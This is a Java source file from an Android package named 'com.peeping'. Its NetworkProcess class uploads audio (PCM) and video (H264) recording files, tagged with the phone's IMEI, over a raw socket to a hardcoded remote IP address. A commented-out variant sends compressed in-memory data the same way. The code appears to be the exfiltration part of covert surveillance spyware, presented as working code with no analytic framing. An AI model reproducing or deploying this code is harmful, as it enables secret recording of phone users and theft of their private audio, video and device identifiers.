package com.peeping;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.Socket;
import android.util.Log;




public class NetworkProcess implements Runnable{
	
	private final String TAG ="NetworkProcess";
	private String SERVER_IP_ADDRESS="1.32.200.51";
	private final int SERVER_DATA_PORT = 65535; 
	private final int IMEI_IMSI_PHONE_SIZE = 16;
	public static final int CMD_UPLOAD_PCMFILE = 1;
	public static final int CMD_UPLOAD_H264FILE = 2;
	public static final int CMD_UPLOAD_H264PARAM = 3;
	public final int SEND_FILE_BLOCK_SIZE = 0x100000;

	//private byte[] senddata = null;
	private int cmd = 0;
	private byte[] imei = new byte[IMEI_IMSI_PHONE_SIZE];
	private byte[] filename;
	private String procfilename;

	/*
	NetworkProcess(byte[] senddata,int cmd,byte[] byteimei,String filename){
		this.senddata = senddata;
		this.cmd = cmd;
		if (filename != null) {
			this.filename = filename.getBytes();
		}else{
			this.filename = null;
		}
		
		System.arraycopy(byteimei, 0, imei, 0, byteimei.length);
		android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_URGENT_AUDIO);
		Log.e(TAG, "senddata data init");
	}
	*/
	
	
	NetworkProcess(String procfilename,int cmd,byte[] byteimei,String filename){
		this.procfilename = procfilename;
		this.cmd = cmd;
		if (filename != null) {
			this.filename = filename.getBytes();
		}else{
			this.filename = null;
		}
		
		System.arraycopy(byteimei, 0, imei, 0, byteimei.length);
		android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_URGENT_AUDIO);
		Log.e(TAG, "senddata data init");
	}
	
	
	
	
	
	@Override
	public void run(){
		try{
			byte[] sendblock = new byte[SEND_FILE_BLOCK_SIZE];
			
			File file=new File(this.procfilename);
			int filesize = (int)file.length();
			FileInputStream fin=new FileInputStream(file);
			int sendsize = 4 + 4 + IMEI_IMSI_PHONE_SIZE + 4 + filename.length + 4 + filesize;	
			
			int size = 0;
			
			byte bytesendsize[] = PublicFunction.intToBytes(sendsize);
			for (int i = 0; i < bytesendsize.length; i++) {
				sendblock[size + i] = bytesendsize[i];
			}
			size += 4;
			
			byte[] bytecmd = PublicFunction.intToBytes(this.cmd);
			for (int i = 0; i < bytecmd.length; i++) {
				sendblock[size + i] = bytecmd[i];
			}
			size += 4;
			
			for (int i = 0; i < imei.length; i++) {
				sendblock[size + i] = imei[i];
			}
			size += IMEI_IMSI_PHONE_SIZE;
			

			byte[] bytefnlen = PublicFunction.intToBytes(this.filename.length);
			for (int i = 0; i < bytefnlen.length; i++) {
				sendblock[size + i] = bytefnlen[i];
			}
			size += 4;
			
			for (int i = 0; i < this.filename.length; i++) {
				sendblock[size + i] = this.filename[i];
			}
			size += this.filename.length;
			
			byte[] bytedatalen = PublicFunction.intToBytes(filesize);
			for (int i = 0; i < bytedatalen.length; i++) {
				sendblock[size + i] = bytedatalen[i];
			}
			size += 4;
			
			Socket socket = new Socket(SERVER_IP_ADDRESS, SERVER_DATA_PORT);
			OutputStream ous = socket.getOutputStream();
			ous.write(sendblock, 0, size);
			ous.flush();

			int sendtimes = filesize/SEND_FILE_BLOCK_SIZE;
			int sendmod = filesize%SEND_FILE_BLOCK_SIZE;

			for (int k = 0; k < sendtimes; k++) {
				fin.read(sendblock,0,SEND_FILE_BLOCK_SIZE);
				ous.write(sendblock, 0, SEND_FILE_BLOCK_SIZE);
				ous.flush();
			}

			if(sendmod != 0) {
				fin.read(sendblock,0,sendmod);
				ous.write(sendblock, 0, sendmod);
				ous.flush();
			}
		
			ous.flush();
			ous.close();
			socket.close();
			fin.close();
			
			Log.e(TAG, "send file complete:"+this.procfilename);
			return;
		} catch (Exception ex) {
			ex.printStackTrace();
			String error = PublicFunction.getExceptionDetail(ex);
			String stack = PublicFunction.getCallStack();
			PublicFunction.writeLogFile("NetworkProcess run() exception:" + error + "\r\nstack:" + stack + "\r\n");
			return;
		}
	}
	
	
	
	
	
	/*
	@Override
	public void run(){
		try{
			byte []data;
			if (this.cmd == CMD_UPLOAD_PCMFILE) {
				data = PublicFunction.zcompress(senddata);
			}else{
				data = this.senddata;
			}
			
			int sendsize = 4 + 4 + IMEI_IMSI_PHONE_SIZE + 4 + filename.length + 4 + data.length;	
			byte[] sendpack = new byte[sendsize];
		
			int size = 0;
			byte bytesendseize[] = PublicFunction.intToBytes(sendsize);
			for (int i = 0; i < bytesendseize.length; i++) {
				sendpack[size + i] = bytesendseize[i];
			}
			size += 4;
			
			byte[] bytecmd = PublicFunction.intToBytes(this.cmd);
			for (int i = 0; i < bytecmd.length; i++) {
				sendpack[size + i] = bytecmd[i];
			}
			size += 4;
			
			for (int i = 0; i < imei.length; i++) {
				sendpack[size + i] = imei[i];
			}
			size += IMEI_IMSI_PHONE_SIZE;
			
			//if (cmd == CMD_UPLOAD_H264FILE || cmd == CMD_UPLOAD_PCMFILE) {
				byte[] bytefnlen = PublicFunction.intToBytes(this.filename.length);
				for (int i = 0; i < bytefnlen.length; i++) {
					sendpack[size + i] = bytefnlen[i];
				}
				size += 4;
				
				for (int i = 0; i < this.filename.length; i++) {
					sendpack[size + i] = this.filename[i];
				}
				size += this.filename.length;
				
				byte[] bytedatalen = PublicFunction.intToBytes(data.length);
				for (int i = 0; i < bytedatalen.length; i++) {
					sendpack[size + i] = bytedatalen[i];
				}
				size += 4;
			//}

			for (int i = 0; i < data.length; i++) {
				sendpack[size + i] = data[i];
			}
			size += data.length;

			Socket socket = new Socket(SERVER_IP_ADDRESS, SERVER_DATA_PORT);
			OutputStream ous = socket.getOutputStream();
			ous.write(sendpack, 0, sendsize);
			ous.flush();
			ous.close();
			socket.close();
			
			Log.e(TAG, "send file complete");
			return;
		} catch (Exception ex) {
			ex.printStackTrace();
			String error = PublicFunction.getExceptionDetail(ex);
			String stack = PublicFunction.getCallStack();
			PublicFunction.writeLogFile("NetworkProcess run() exception:" + error + "\r\nstack:" + stack + "\r\n");
			return;
		}
	}
	*/


}

